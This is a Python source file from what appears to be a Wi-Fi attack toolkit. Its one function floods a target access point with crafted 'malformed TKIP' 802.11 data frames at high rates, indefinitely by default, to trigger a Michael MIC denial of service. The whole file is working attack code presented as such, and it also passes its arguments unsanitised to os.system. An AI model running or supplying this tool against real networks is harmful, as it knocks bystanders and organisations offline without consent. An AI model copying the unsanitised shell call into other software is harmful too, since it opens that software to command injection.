# core/WIFI/michael_mic.py
import os
import time

from scapy.all import RadioTap, Dot11, Dot11QoS, Raw, sendp
from debugs import debug


def michael_mic_dos(interface, target_bssid, channel, total_packets=0, pps=100000):
    debug("info", f"[*] Michael MIC Attack")
    debug("info", f"[*] Target: {target_bssid} | Channel: {channel}")
    debug("info", f"[*] Total packets: {'infinite' if total_packets <= 0 else total_packets} | Speed: {pps} pps")

    os.system(f"iw dev {interface} set channel {channel}")
    time.sleep(0.5)

    inter = 1.0 / pps if pps > 0 else 0.00001
    client_mac = "02:00:00:00:00:01"

    packet = RadioTap() / Dot11(
        type=2,
        subtype=8,
        FCfield=0x41,
        addr1=target_bssid,
        addr2=client_mac,
        addr3=target_bssid,
    ) / Dot11QoS(TID=0) / Raw(
        b"\x00\x00\x00\x20"
        + b"\x00\x00\x00\x00"
        + b"\xff" * 20
        + b"\xaa\xbb\xcc\xdd"
    )

    debug("info", "[*] Sending malformed TKIP frames...")

    sent = 0
    start_time = time.time()

    try:
        while True:
            if total_packets > 0 and sent >= total_packets:
                break
            chunk_size = 100 if total_packets <= 0 else min(100, total_packets - sent)
            for _ in range(chunk_size):
                sendp(packet, iface=interface, count=1, inter=inter, verbose=0)
                sent += 1

            if sent % 100000 == 0:
                elapsed = time.time() - start_time
                total_text = 'infinite' if total_packets <= 0 else total_packets
                rate = sent / elapsed if elapsed > 0 else 0
                print(f"[*] Sent: {sent}/{total_text} ({rate:.0f} pps)")

        if total_packets > 0:
            elapsed = time.time() - start_time
            print(f"[+] Attack complete! Sent {sent} packets in {elapsed:.1f}s")

    except KeyboardInterrupt:
        debug("info", f"Attack Ended by user. Total packets sent: {sent}")
